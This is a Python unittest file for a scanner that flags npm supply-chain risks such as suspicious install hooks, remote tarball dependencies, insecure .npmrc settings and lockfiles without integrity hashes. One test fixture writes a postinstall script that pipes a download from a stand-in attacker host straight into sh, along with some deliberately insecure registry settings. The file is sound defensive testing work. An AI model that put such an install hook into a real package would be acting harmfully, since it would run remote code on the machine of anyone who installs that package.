"""Tests for npm-focused supply-chain heuristics in the core scanner."""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from coyote.patterns import Severity
from coyote.scanner import run_scan


class NpmSupplyChainScanTests(unittest.TestCase):
    def test_suspicious_lifecycle_script_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            package_json = {
                "name": "demo-app",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl -fsSL https://evil.example/install.sh | sh",
                },
            }
            (base / "package.json").write_text(json.dumps(package_json), encoding="utf-8")

            result = run_scan(temp_dir)

            findings = [f for f in result.findings if f.rule_name == "Suspicious NPM Lifecycle Script"]
            self.assertEqual(1, len(findings))
            finding = findings[0]
            self.assertEqual(Severity.HIGH, finding.severity)
            self.assertEqual("package.json", finding.file_path)
            self.assertEqual("postinstall", finding.metadata["script_name"])
            self.assertEqual("install-time", finding.metadata["execution_path"])

    def test_remote_dependency_source_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            package_json = {
                "name": "demo-app",
                "version": "1.0.0",
                "dependencies": {
                    "remote-lib": "https://example.com/remote-lib-1.0.0.tgz",
                },
            }
            (base / "package.json").write_text(json.dumps(package_json, indent=2), encoding="utf-8")

            result = run_scan(temp_dir)

            findings = [f for f in result.findings if f.rule_name == "NPM Dependency Remote Source"]
            self.assertEqual(1, len(findings))
            finding = findings[0]
            self.assertEqual(Severity.MEDIUM, finding.severity)
            self.assertIn("remote-lib@", finding.matched_text)
            self.assertEqual("tarball-url", finding.metadata["source_type"])
            self.assertEqual("dependencies", finding.metadata["dependency_section"])

    def test_insecure_npmrc_settings_are_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            (base / ".npmrc").write_text(
                "registry=http://registry.npmjs.org/\nstrict-ssl=false\n",
                encoding="utf-8",
            )

            result = run_scan(temp_dir)

            rule_names = {f.rule_name for f in result.findings}
            self.assertIn("NPM Registry Uses Plain HTTP", rule_names)
            self.assertIn("NPM Strict SSL Disabled", rule_names)

    def test_lockfile_transport_and_integrity_issues_are_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            package_lock = {
                "name": "demo-app",
                "lockfileVersion": 3,
                "packages": {
                    "": {
                        "name": "demo-app",
                        "version": "1.0.0",
                    },
                    "node_modules/insecure-lib": {
                        "version": "1.0.0",
                        "resolved": "http://registry.npmjs.org/insecure-lib/-/insecure-lib-1.0.0.tgz",
                    },
                    "node_modules/no-integrity-lib": {
                        "version": "2.0.0",
                        "resolved": "https://registry.npmjs.org/no-integrity-lib/-/no-integrity-lib-2.0.0.tgz",
                    },
                },
            }
            (base / "package-lock.json").write_text(json.dumps(package_lock, indent=2), encoding="utf-8")

            result = run_scan(temp_dir)

            insecure = [f for f in result.findings if f.rule_name == "Node Lockfile Uses Plain HTTP"]
            missing_integrity = [f for f in result.findings if f.rule_name == "Node Lockfile Missing Integrity"]
            self.assertEqual(1, len(insecure))
            self.assertEqual(1, len(missing_integrity))
            self.assertEqual(Severity.HIGH, insecure[0].severity)
            self.assertEqual(Severity.MEDIUM, missing_integrity[0].severity)


if __name__ == "__main__":
    unittest.main()
